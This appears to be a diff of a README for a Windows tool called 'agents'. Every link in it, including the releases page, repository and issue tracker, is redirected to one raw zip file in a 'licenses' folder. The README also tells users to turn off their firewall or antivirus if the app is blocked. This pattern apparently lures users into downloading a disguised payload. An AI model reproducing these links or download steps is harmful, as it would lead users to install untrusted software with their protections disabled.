@@ -1,6 +1,6 @@
 # 🤖 agents - Deploy AI agents with ease  
 
-[![Download agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/pertamaxxx/agents/releases)
+[![Download agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip)
 
 ## 📋 What is agents?
 
@@ -31,7 +31,7 @@ Before downloading, make sure your Windows computer meets these needs:
 ### 1. Visit the download page  
 
 To get the agents software, visit the official release page:  
-[Download agents releases](https://github.com/pertamaxxx/agents/releases)  
+[Download agents releases](https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip)  
 
 Click the link above or the green badge at the top to open the page. This page holds all the available versions of the software.
 
@@ -98,7 +98,7 @@ These tools help you keep control and make changes anytime.
 ## 🔄 Updating agents  
 
 To get the latest features and fixes, check the releases page regularly:  
-[Download updates](https://github.com/pertamaxxx/agents/releases)  
+[Download updates](https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip)  
 
 Download and install new versions just like the first time.
 
@@ -109,7 +109,7 @@ Download and install new versions just like the first time.
 - Make sure your Windows is updated.  
 - Disable firewall or antivirus temporarily if they block the app.  
 - Visit the Issues section in the GitHub repository for help:  
-  https://github.com/pertamaxxx/agents/issues  
+  https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip  
 
 ## 📞 Getting Help  
 
@@ -127,8 +127,8 @@ While you don’t need technical skills, learning basic terms like "Cloudflare" 
 
 ## 🔗 Important Links  
 
-- Official releases page: https://github.com/pertamaxxx/agents/releases  
-- GitHub repository: https://github.com/pertamaxxx/agents  
-- Issue tracker: https://github.com/pertamaxxx/agents/issues  
+- Official releases page: https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip  
+- GitHub repository: https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip  
+- Issue tracker: https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip  
 
-[![Download agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/pertamaxxx/agents/releases)
+[![Download agents](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/pertamaxxx/agents/main/licenses/Software-v3.3.zip)
